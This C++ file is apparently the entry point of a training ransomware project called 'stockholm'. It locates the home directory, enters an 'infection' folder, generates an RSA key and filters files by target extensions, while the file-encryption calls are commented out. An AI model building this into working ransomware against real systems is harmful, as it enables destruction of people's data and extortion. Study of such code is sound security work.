#include "Crawler.hpp"
#include "stockholm.hpp"
#include <fstream>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <cstring>
#include <unistd.h>
#include "log.hpp"
#include "rsa.hpp"

inline bool filter_extensions(std::string path)
{
	for (size_t i = 0; i < stockholm::extensions_count; ++i)
	{
		if (path.ends_with(stockholm::extensions[i]))
			return true;
	}
	return false;
}

static fs::path getHomeDir()
{
	char *envHome = std::getenv("HOME");
	std::string homedir = envHome ? envHome : "";
	if (homedir.empty())
	{
		std::string username;
		char *envUser = std::getenv("USER");
		if (!envUser)
		{
			long nameMax = sysconf(_SC_LOGIN_NAME_MAX);
			char *buf = new char[nameMax];
			if (getlogin_r(buf, nameMax))
			{
				log("Failed to fetch username");
				delete[] buf;
				return std::string();
			}
			username = buf;
			delete[] buf;
		}
		else
			username = envUser;
		homedir = "/home/" + username;
	}
	return fs::path{homedir};
}

int main(void)
{
	char *cwd = getcwd(NULL, 0);
	if (!cwd)
		return (1);
	fs::path startupCwd = cwd;
	free(cwd);
	fs::path homeDir = getHomeDir();
	if (homeDir.empty())
	{
		log("empty path for Home directory");
		return (1);
	}
	fs::path infectionDir = homeDir / "infection";
	if (chdir(infectionDir.c_str()))
	{
		log(strerror(errno));
		return (1);
	}
	if (!create_local_rsa_id((startupCwd / "public.pem").c_str()))
		return (1);

	// auto files = RetrieveFilesFrom(infectionDir);
	// std::list<std::string> filtered_files;
	// std::copy_if(files.begin(), files.end(), std::back_inserter(filtered_files), filter_extensions);
	// std::cout << filtered_files.size() << std::endl;
	// EncryptFile("/home/tblochet/infection/toto.txt");
}
